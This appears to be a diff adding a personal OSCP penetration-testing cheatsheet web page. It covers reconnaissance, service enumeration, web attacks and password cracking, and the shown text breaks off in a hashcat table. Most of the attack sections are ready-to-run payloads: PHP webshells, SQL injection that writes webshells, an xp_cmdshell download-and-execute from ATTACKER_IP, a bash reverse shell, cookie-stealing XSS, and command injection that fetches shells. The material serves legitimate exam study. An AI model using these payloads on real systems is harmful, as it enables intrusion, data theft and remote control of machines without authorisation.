@@ -1,0 +1,1997 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>OSCP | Notes v2</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="./img/oscp_icon.png" rel="icon">
+  <link href="./img/oscp_icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="./vendor/aos/aos.css" rel="stylesheet">
+  <link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="./vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <!-- Prism CSS -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+  <!-- Template Main CSS File -->
+  <link href="./css/style.css" rel="stylesheet">
+
+  <!-- Open Graph meta tags -->
+  <meta property="og:title" content="OSCP Notes v2">
+  <meta property="og:description" content="Clean, concise OSCP penetration testing cheatsheet.">
+  <meta property="og:image" content="./img/favicon.png">
+  <meta property="og:url" content="./oscp_new.html">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card meta tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="OSCP Notes v2">
+  <meta name="twitter:description" content="Clean, concise OSCP penetration testing cheatsheet.">
+  <meta name="twitter:image" content="./img/favicon.png">
+  <style>
+  /* Index sidebar color flow (bell curve, blue hue=216) */
+  .section-flow-1{background-color:#e2e5ea;}
+  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#e2e5ea;}
+  .section-flow-2{background-color:#d2d9e2;}
+  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#d2d9e2;}
+  .section-flow-3{background-color:#c1ccdc;}
+  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#c1ccdc;}
+  .section-flow-4{background-color:#adbed8;}
+  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#adbed8;}
+  .section-flow-5{background-color:#98b1d5;}
+  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#98b1d5;}
+  .section-flow-6{background-color:#82a3d4;}
+  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#82a3d4;}
+  .section-flow-7{background-color:#82a3d4;}
+  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#82a3d4;}
+  .section-flow-8{background-color:#98b1d5;}
+  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#98b1d5;}
+  .section-flow-9{background-color:#adbed8;}
+  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#adbed8;}
+  .section-flow-10{background-color:#c1ccdc;}
+  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:#c1ccdc;}
+  .section-flow-11{background-color:#d2d9e2;}
+  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:#d2d9e2;}
+  .section-flow-12{background-color:#e2e5ea;}
+  .section-flow-12 .dropdown-container,.section-flow-12 .nested-dropdown-container{background-color:#e2e5ea;}
+  </style>
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <button type="button" class="menu-trigger" onclick="toggleMenu()" aria-label="Toggle menu" aria-expanded="false"><i class="bi bi-list"></i><i class="bi bi-x-lg"></i></button>
+  <div class="menu-backdrop" onclick="closeMenu()" aria-hidden="true"></div>
+
+  <!-- ======= Header ======= -->
+  <!-- ======= Top Bar (brand strip; always visible) ======= -->
+  <div id="topbar">
+    <div class="topbar-social">
+      <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" rel="noopener noreferrer" class="linkedin" aria-label="LinkedIn"><i class="bi bi-linkedin"></i></a>
+      <div class="topbar-email-wrap">
+        <button type="button" class="topbar-email" onclick="toggleTopbarEmail(event)" aria-label="Email" aria-haspopup="dialog" aria-expanded="false"><i class="bi bi-envelope-fill"></i></button>
+        <div id="topbar-email-popup" class="topbar-email-popup" role="dialog" aria-label="Contact email">
+          <span class="topbar-email-text">xuewencheng156@gmail.com</span>
+          <button type="button" class="topbar-email-copy" onclick="copyTopbarEmail(event)" title="Copy"><i class="bi bi-clipboard"></i></button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+        <h1 class="text-light"><a href="index.html">Wencheng Xue</a></h1>
+        <div class="social-links mt-3 text-center">
+          <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" class="linkedin"><i class="bi bi-linkedin"></i></a>
+          <div class="sidebar-email-wrap">
+            <button type="button" class="sidebar-email" onclick="toggleSidebarEmail(event)" aria-label="Email" aria-haspopup="dialog" aria-expanded="false"><i class="bi bi-envelope-fill"></i></button>
+            <div id="sidebar-email-popup" class="sidebar-email-popup" role="dialog" aria-label="Contact email">
+              <span class="sidebar-email-text">xuewencheng156@gmail.com</span>
+              <button type="button" class="sidebar-email-copy" onclick="copySidebarEmail(event)" title="Copy"><i class="bi bi-clipboard"></i></button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="./index.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li class="dropdown">
+            <a href="./oscp.html" class="nav-link scrollto" onclick="toggleSubmenu(event)"><i
+                class="bi bi-laptop navicon"></i>Notes <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul id="submenu" class="submenu">
+              <li><a href="./oscp.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP Icon" class="nav-icon-img">OSCP</a></li>
+              <li><a href="./osep.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" class="nav-icon-img">OSEP</a></li>
+              <li><a href="./oswe.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" class="nav-icon-img">OSWE</a></li>
+              <li><a href="./osed.html" class="nav-link scrollto"><img src="./img/osed_icon.svg" alt="OSED Icon" class="nav-icon-img">OSED</a></li>
+              <li><a href="#" class="nav-link scrollto nav-disabled" onclick="return false;"><img src="./img/osai_icon.svg" alt="OSAI Icon" class="nav-icon-img">OSAI <span class="coming-soon-badge">Coming Soon</span></a></li>
+              <li><a href="./crto.html" class="nav-link scrollto"><img src="./img/crto_icon.png" alt="CRTO Icon" class="nav-icon-img">CRTO</a></li>
+              <li><a href="./crtl.html" class="nav-link scrollto"><img src="./img/crtl_icon.png" alt="CRTL Icon" class="nav-icon-img">CRTL</a></li>
+            </ul>
+          </li>
+          <li class="dropdown">
+            <a href="./oscp_new.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
+                class="bi bi-journal-text navicon"></i>Notesv2 <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul id="submenu2" class="submenu open">
+              <li><a href="./oscp_new.html" class="nav-link scrollto active"><img src="./img/oscp_icon.png" alt="OSCP Icon" class="nav-icon-img">OSCP</a></li>
+              <li><a href="./osep_new.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" class="nav-icon-img">OSEP</a></li>
+              <li><a href="./oswe_new.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" class="nav-icon-img">OSWE</a></li>
+              <li><a href="./osed_new.html" class="nav-link scrollto"><img src="./img/osed_icon.svg" alt="OSED Icon" class="nav-icon-img">OSED</a></li>
+            </ul>
+          </li>
+          <li><a href="./portfolio.html" class="nav-link scrollto"><i class="bi bi-folder-fill navicon"></i><span>Portfolio</span></a></li>
+          <li class="dropdown">
+            <a href="./projects.html" class="nav-link scrollto" onclick="toggleSubmenu(event)"><i
+                class="bi bi-code-square navicon"></i>Projects <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul class="submenu">
+              <li><a href="./sliver-c2-evasion-suite.html" class="nav-link scrollto"><i class="bi bi-shield-shaded" style="font-size: 18px; vertical-align: middle; margin-right: 6px; color: #6f42c1;"></i>Sliver C2 Evasion Suite</a></li>
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>OSCP Notes v2</h2>
+          <p class="text-muted small">Latest update: June, 2026</p>
+          <ol>
+            <li><a href="index.html">Home</a></li>
+            <li>OSCP Notes v2</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <div class="cheatsheet-content">
+
+<!-- ============================================================ -->
+<!-- 1. INFORMATION GATHERING                                      -->
+<!-- ============================================================ -->
+<h2 id="information-gathering">1. Information Gathering</h2>
+
+              <h3 id="info-passive">1.1 Passive Reconnaissance</h3>
+              <p>Collect intelligence without sending traffic to the target.</p>
+
+              <pre><code class="language-bash"># WHOIS
+whois megacorpone.com
+whois megacorpone.com -h 192.168.1.1
+
+# Google dorks
+site:megacorpone.com
+site:megacorpone.com -filetype:html
+filetype:pdf site:megacorpone.com
+intitle:"index of" site:megacorpone.com
+# Full reference: https://www.exploit-db.com/google-hacking-database</code></pre>
+
+              <pre><code class="language-bash"># crt.sh — certificate transparency for subdomain discovery
+curl -s "https://crt.sh/?q=%25.megacorpone.com&amp;output=json" | jq -r '.[].name_value' | sort -u
+
+# theHarvester — emails, subdomains, IPs from multiple sources
+theHarvester -d megacorpone.com -b google,bing,crtsh</code></pre>
+
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Tool / Source</th>
+                    <th>What It Gives You</th>
+                    <th>Key Command / URL</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>WHOIS</td><td>Registrar, NS, registrant contact, dates</td><td><code>whois [domain]</code></td></tr>
+                  <tr><td>Google dorks</td><td>Indexed files, login pages, config leaks</td><td><code>site:target.com filetype:pdf</code></td></tr>
+                  <tr><td>Shodan</td><td>Open ports, banners, CVE tags</td><td><code>hostname:target.com</code> on shodan.io</td></tr>
+                  <tr><td>crt.sh</td><td>All TLS certs issued (reveals subdomains)</td><td><code>https://crt.sh/?q=%25.target.com</code></td></tr>
+                  <tr><td>theHarvester</td><td>Emails, subdomains, employee names</td><td><code>theHarvester -d target.com -b google</code></td></tr>
+                  <tr><td>Netcraft</td><td>Hosting history, OS/web server, site age</td><td>searchdns.netcraft.com</td></tr>
+                  <tr><td>gitrob / gitleaks</td><td>Secrets, keys in public repos</td><td><code>gitleaks detect --source .</code></td></tr>
+                </tbody>
+              </table>
+
+              <h3 id="info-dns">1.2 DNS Enumeration</h3>
+              <p>Resolve hostnames, discover subdomains, and attempt zone transfers.</p>
+
+              <pre><code class="language-bash"># Standard lookups
+host megacorpone.com
+host -t mx megacorpone.com
+host -t txt megacorpone.com
+
+# DNS zone transfer attempt
+host -l megacorpone.com ns1.megacorpone.com
+dig axfr megacorpone.com @ns1.megacorpone.com
+dnsrecon -d megacorpone.com -t axfr
+
+# Brute-force subdomains
+dnsrecon -d megacorpone.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
+gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 30</code></pre>
+
+              <pre><code class="language-bash"># Reverse DNS sweep
+dnsrecon -r 192.168.1.0/24 -n 192.168.1.1
+
+# DNSEnum — automated DNS enumeration
+dnsenum megacorpone.com</code></pre>
+
+              <h3 id="info-scanning">1.3 Active Scanning</h3>
+              <p>Port scanning and service enumeration against live targets.</p>
+
+              <pre><code class="language-bash"># Nmap — full TCP scan
+nmap -sC -sV -oN nmap/tcp_full.txt -p- 192.168.1.10
+
+# Nmap — top 1000 quick scan
+nmap -sC -sV -oN nmap/tcp_quick.txt 192.168.1.10
+
+# Nmap — UDP top 200
+sudo nmap -sU --top-ports 200 -oN nmap/udp_top200.txt 192.168.1.10
+
+# Nmap — vulnerability scripts
+nmap --script vuln -p 80,443,445 192.168.1.10</code></pre>
+
+              <pre><code class="language-bash"># RustScan — fast port discovery, then pass to nmap
+rustscan -a 192.168.1.10 -- -sC -sV -oN nmap/rustscan.txt
+
+# Netcat port scan (no nmap available)
+nc -nvz -w 1 192.168.1.10 1-1000 2&gt;&amp;1 | grep open</code></pre>
+
+              <h3 id="info-ports">1.4 Common Port Enumeration</h3>
+              <p>Service-specific enumeration for frequently encountered ports.</p>
+
+              <pre><code class="language-bash"># 21: FTP
+nmap --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor -p 21 $IP
+ftp -A $IP                    # anonymous login
+wget -m ftp://anonymous:@$IP  # mirror entire FTP
+
+# 22: SSH
+nmap --script ssh2-enum-algos,ssh-hostkey -p 22 $IP
+ssh -o PubkeyAuthentication=no $USER@$IP
+
+# 25: SMTP
+nmap --script smtp-commands,smtp-enum-users,smtp-open-relay -p 25 $IP
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
+
+# 53: DNS
+dig axfr @$IP target.com
+dnsrecon -d target.com -n $IP</code></pre>
+
+              <pre><code class="language-bash"># 139/445: SMB
+smbclient -L //$IP/ -N
+smbmap -H $IP
+smbmap -H $IP -u '' -p ''
+enum4linux -a $IP
+nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 $IP
+crackmapexec smb $IP --shares -u '' -p ''
+
+# Recursively download a share
+smbget -R smb://$IP/share
+smbclient //$IP/share -N -c 'recurse;prompt;mget *'</code></pre>
+
+              <pre><code class="language-bash"># 161 (UDP): SNMP
+sudo nmap -sU -p 161 --script snmp-brute $IP
+snmpwalk -v2c -c public $IP
+snmpwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP</code></pre>
+
+              <pre><code class="language-bash"># 389/636: LDAP
+nmap -n -sV --script "ldap* and not brute" -p 389 $IP
+ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local"
+ldapsearch -x -H ldap://$IP -D 'CN=user,DC=corp,DC=local' -w 'password' -b "DC=corp,DC=local"
+
+# 1433: MSSQL
+nmap --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password -p 1433 $IP
+impacket-mssqlclient user:password@$IP -windows-auth
+
+# 3306: MySQL
+nmap --script mysql-info,mysql-enum -p 3306 $IP
+mysql -u root -p -h $IP
+
+# 5432: PostgreSQL
+psql -h $IP -U postgres
+nmap --script pgsql-brute -p 5432 $IP</code></pre>
+
+              <pre><code class="language-bash"># 2049: NFS
+showmount -e $IP
+sudo mount -t nfs $IP:/share /mnt/nfs
+
+# 3389: RDP
+nmap --script rdp-enum-encryption,rdp-ntlm-info -p 3389 $IP
+xfreerdp /v:$IP /u:user /p:password +clipboard /dynamic-resolution
+
+# 5985/5986: WinRM
+evil-winrm -i $IP -u user -p password
+crackmapexec winrm $IP -u user -p password
+
+# 6379: Redis
+redis-cli -h $IP
+redis-cli -h $IP INFO</code></pre>
+
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Port</th>
+                    <th>Service</th>
+                    <th>Quick Win</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>21</td><td>FTP</td><td>Anonymous login, version exploits (vsftpd 2.3.4)</td></tr>
+                  <tr><td>22</td><td>SSH</td><td>Brute force with known users, key reuse</td></tr>
+                  <tr><td>25/587</td><td>SMTP</td><td>User enumeration (VRFY/EXPN), open relay</td></tr>
+                  <tr><td>53</td><td>DNS</td><td>Zone transfer, subdomain brute force</td></tr>
+                  <tr><td>80/443</td><td>HTTP/S</td><td>Web app attacks, default creds on admin panels</td></tr>
+                  <tr><td>88</td><td>Kerberos</td><td>AS-REP roasting, Kerberoasting</td></tr>
+                  <tr><td>110/143</td><td>POP3/IMAP</td><td>Read emails with valid creds</td></tr>
+                  <tr><td>111</td><td>RPCbind</td><td><code>rpcinfo -p $IP</code>, find NFS/mountd</td></tr>
+                  <tr><td>135</td><td>MSRPC</td><td><code>rpcclient -U '' -N $IP</code></td></tr>
+                  <tr><td>139/445</td><td>SMB</td><td>Null session, share enumeration, EternalBlue</td></tr>
+                  <tr><td>161</td><td>SNMP (UDP)</td><td>Community string brute force, data extraction</td></tr>
+                  <tr><td>389/636</td><td>LDAP</td><td>Anonymous bind, user/group enumeration</td></tr>
+                  <tr><td>1433</td><td>MSSQL</td><td><code>xp_cmdshell</code>, linked servers</td></tr>
+                  <tr><td>2049</td><td>NFS</td><td>Mount shares, check for no_root_squash</td></tr>
+                  <tr><td>3306</td><td>MySQL</td><td>UDF exploit, file read/write</td></tr>
+                  <tr><td>3389</td><td>RDP</td><td>BlueKeep (CVE-2019-0708), brute force</td></tr>
+                  <tr><td>5432</td><td>PostgreSQL</td><td><code>COPY ... FROM PROGRAM</code> for RCE</td></tr>
+                  <tr><td>5985</td><td>WinRM</td><td>Evil-WinRM with valid creds/hash</td></tr>
+                  <tr><td>6379</td><td>Redis</td><td>Unauthenticated access, write SSH key or webshell</td></tr>
+                </tbody>
+              </table>
+
+              <pre><code class="language-bash"># 88: Kerberos enumeration
+nmap --script krb5-enum-users --script-args krb5-enum-users.realm='corp.local' -p 88 $IP
+kerbrute userenum --dc $IP -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# 110/143: POP3/IMAP — read emails
+telnet $IP 110
+USER admin
+PASS password
+LIST
+RETR 1
+
+# 135: MSRPC enumeration
+rpcclient -U '' -N $IP
+rpcclient -U 'user%password' $IP
+# Inside rpcclient:
+enumdomusers
+enumdomgroups
+queryuser 0x1f4
+querydispinfo
+
+# Unknown port — always check with Netcat or curl
+nc -nv $IP PORT
+curl -v http://$IP:PORT/</code></pre>
+
+
+<!-- ============================================================ -->
+<!-- 2. WEB APPLICATION ATTACKS                                    -->
+<!-- ============================================================ -->
+<h2 id="web-attacks">2. Web Application Attacks</h2>
+
+              <h3 id="web-enum">2.1 Directory &amp; File Discovery</h3>
+              <p>Discover hidden files, directories, and web application technologies.</p>
+
+              <pre><code class="language-bash"># Feroxbuster — recursive directory brute force
+feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50
+
+# Gobuster — directory mode
+gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 40
+
+# Gobuster — vhost mode (subdomain discovery)
+gobuster vhost -u http://megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Nikto — web server vulnerability scanner
+nikto -h http://$IP
+
+# Whatweb — technology fingerprinting
+whatweb http://$IP</code></pre>
+
+              <pre><code class="language-bash"># Wfuzz — parameter fuzzing
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 "http://$IP/page?FUZZ=test"
+
+# CMS scanners
+wpscan --url http://$IP --enumerate ap,at,u
+droopescan scan drupal -u http://$IP
+joomscan -u http://$IP</code></pre>
+
+              <pre><code class="language-bash"># Exposed .git directory
+wget -r http://$IP/.git/
+git log --oneline
+git show COMMIT_HASH
+git diff HEAD~5
+
+# WebDAV testing
+davtest -url http://$IP/webdav/
+cadaver http://$IP/webdav/
+
+# API endpoint discovery
+feroxbuster -u http://$IP/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -x json
+gobuster dir -u http://$IP/api/v1 -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre>
+
+              <h3 id="web-lfi-rfi">2.2 LFI / RFI</h3>
+              <p>Local and Remote File Inclusion for reading files or executing code.</p>
+
+              <pre><code class="language-bash"># Basic LFI payloads
+http://$IP/page?file=../../../etc/passwd
+http://$IP/page?file=....//....//....//etc/passwd
+http://$IP/page?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Null byte (PHP &lt; 5.3.4)
+http://$IP/page?file=../../../etc/passwd%00
+
+# PHP wrappers
+http://$IP/page?file=php://filter/convert.base64-encode/resource=index.php
+http://$IP/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&amp;cmd=id
+http://$IP/page?file=expect://id</code></pre>
+
+              <pre><code class="language-bash"># LFI to RCE via log poisoning
+# 1. Inject PHP into a log file
+curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://$IP/
+# 2. Include the log file
+http://$IP/page?file=/var/log/apache2/access.log&amp;cmd=id
+
+# RFI — Remote File Inclusion (allow_url_include = On)
+http://$IP/page?file=http://ATTACKER_IP/shell.php
+
+# Windows paths
+http://$IP/page?file=C:\Windows\System32\drivers\etc\hosts
+http://$IP/page?file=..\..\..\..\Windows\System32\drivers\etc\hosts</code></pre>
+
+              <p>Key files to target:</p>
+              <ul>
+                <li>Linux: <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/home/user/.ssh/id_rsa</code>, <code>/var/log/apache2/access.log</code>, <code>/proc/self/environ</code></li>
+                <li>Windows: <code>C:\Windows\System32\drivers\etc\hosts</code>, <code>C:\inetpub\wwwroot\web.config</code>, <code>C:\inetpub\logs\LogFiles\</code></li>
+              </ul>
+
+              <h3 id="web-sqli">2.3 SQL Injection</h3>
+              <p>Manual testing and automated exploitation of SQL injection flaws.</p>
+
+              <pre><code class="language-sql">-- Detection payloads
+' OR 1=1-- -
+" OR 1=1-- -
+' OR '1'='1
+1 OR 1=1
+
+-- UNION-based (find column count first)
+' ORDER BY 1-- -
+' ORDER BY 5-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT 1,2,3-- -
+
+-- Extract data (MySQL)
+' UNION SELECT 1,user(),database()-- -
+' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT 1,username,password FROM users-- -</code></pre>
+
+              <pre><code class="language-sql">-- Error-based (MySQL)
+' AND extractvalue(1, concat(0x7e,(SELECT user()),0x7e))-- -
+
+-- Boolean blind
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
+
+-- Time-based blind
+' AND IF(1=1, SLEEP(3), 0)-- -
+
+-- Read files (MySQL)
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
+
+-- Write webshell (MySQL, FILE privilege)
+' UNION SELECT 1,"&lt;?php system($_GET['cmd']); ?&gt;",3 INTO OUTFILE '/var/www/html/shell.php'-- -</code></pre>
+
+              <pre><code class="language-bash"># sqlmap — automated SQLi
+sqlmap -u "http://$IP/page?id=1" --batch --dbs
+sqlmap -u "http://$IP/page?id=1" -D dbname --tables
+sqlmap -u "http://$IP/page?id=1" -D dbname -T users --dump
+sqlmap -u "http://$IP/page?id=1" --os-shell
+
+# sqlmap with POST data
+sqlmap -u "http://$IP/login" --data="user=admin&amp;pass=test" --batch --dbs
+
+# sqlmap with cookie/headers
+sqlmap -u "http://$IP/page?id=1" --cookie="PHPSESSID=abc123" --batch --dbs</code></pre>
+
+              <pre><code class="language-sql">-- MSSQL specific
+-- Enable xp_cmdshell for RCE
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+-- Stacked queries (MSSQL supports this)
+'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"';--
+
+-- Read files via MSSQL
+SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;
+
+-- PostgreSQL RCE
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+-- Or create a table and use COPY
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'bash -c "bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/443 0&gt;&amp;1"';</code></pre>
+
+              <h3 id="web-xss">2.4 Cross-Site Scripting (XSS)</h3>
+              <p>Inject client-side scripts to steal cookies, redirect users, or perform actions.</p>
+
+              <pre><code class="language-javascript">// Reflected / Stored XSS test payloads
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+&lt;body onload=alert('XSS')&gt;
+
+// Cookie stealing
+&lt;script&gt;new Image().src="http://ATTACKER_IP/steal?c="+document.cookie&lt;/script&gt;
+&lt;img src=x onerror="fetch('http://ATTACKER_IP/steal?c='+document.cookie)"&gt;
+
+// Filter bypass
+&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
+&lt;img src=x onerror=alert(String.fromCharCode(88,83,83))&gt;
+&lt;svg/onload=alert('XSS')&gt;
+javascript:alert('XSS')</code></pre>
+
+              <h3 id="web-upload">2.5 File Upload</h3>
+              <p>Bypass upload restrictions to get a webshell on the target.</p>
+
+              <ul>
+                <li><strong>Extension bypass:</strong> <code>.php</code>, <code>.php5</code>, <code>.phtml</code>, <code>.pHp</code>, <code>.php.jpg</code>, <code>.php%00.jpg</code></li>
+                <li><strong>Content-Type bypass:</strong> Change to <code>image/jpeg</code> or <code>image/png</code></li>
+                <li><strong>Magic bytes:</strong> Prepend <code>GIF89a;</code> before PHP code</li>
+                <li><strong>.htaccess upload:</strong> <code>AddType application/x-httpd-php .evil</code></li>
+              </ul>
+
+              <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+              <pre><code class="language-bash"># Embed PHP in an image
+exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' image.jpg
+mv image.jpg image.php.jpg
+
+# Test the uploaded shell
+curl "http://$IP/uploads/shell.php?cmd=id"</code></pre>
+
+              <h3 id="web-cmdi">2.6 Command Injection</h3>
+              <p>Inject OS commands through application inputs.</p>
+
+              <pre><code class="language-bash"># Common injection operators
+; id
+| id
+|| id
+&amp;&amp; id
+$(id)
+`id`
+
+# Blind command injection (out-of-band)
+; curl http://ATTACKER_IP/$(whoami)
+; ping -c 1 ATTACKER_IP
+| wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh
+
+# Bypass filters
+;{id}
+${IFS}id
+;i\d
+;i''d</code></pre>
+
+
+<!-- ============================================================ -->
+<!-- 3. PASSWORD ATTACKS                                           -->
+<!-- ============================================================ -->
+<h2 id="password-attacks">3. Password Attacks</h2>
+
+              <h3 id="pass-bruteforce">3.1 Brute Force</h3>
+              <p>Online password guessing against network services.</p>
+
+              <pre><code class="language-bash"># Hydra — SSH
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
+
+# Hydra — FTP
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP
+
+# Hydra — HTTP POST form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:user=^USER^&amp;pass=^PASS^:Invalid"
+
+# Hydra — HTTP Basic Auth
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-get /admin
+
+# Hydra — RDP
+hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://$IP
+
+# Hydra — SMB
+hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://$IP</code></pre>
+
+              <h3 id="pass-cracking">3.2 Hash Cracking</h3>
+              <p>Offline cracking with hashcat. Use <code>hashcat --example-hashes</code> to find mode numbers.</p>
+
+              <table class="custom-table">
+                <thead>
+                  <tr>
+                    <th>Hash Type</th>
+                    <th>Mode</th>
+                    <th>Example</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>MD5</td><td>0</td><td><code>hashcat -m 0 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>SHA-1</td><td>100</td><td><code>hashcat -m 100 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>SHA-256</td><td>1400</td><td><code>hashcat -m 1400 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>SHA-512</td><td>1800</td><td><code>hashcat -m 1800 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>bcrypt</td><td>3200</td><td><code>hashcat -m 3200 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>NTLM</td><td>1000</td><td><code>hashcat -m 1000 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>Net-NTLMv2</td><td>5600</td><td><code>hashcat -m 5600 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>Kerberoast (TGS-REP 23)</td><td>13100</td><td><code>hashcat -m 13100 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>AS-REP Roast</td><td>18200</td><td><code>hashcat -m 18200 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>Linux shadow (SHA-512)</td><td>1800</td><td><code>hashcat -m 1800 hash.txt rockyou.txt</code></td></tr>
+                  <tr><td>WPA/WPA2</td><td>22000</td><td><code>hashcat -m 22000 hash.txt rockyou.txt</code></td></tr>
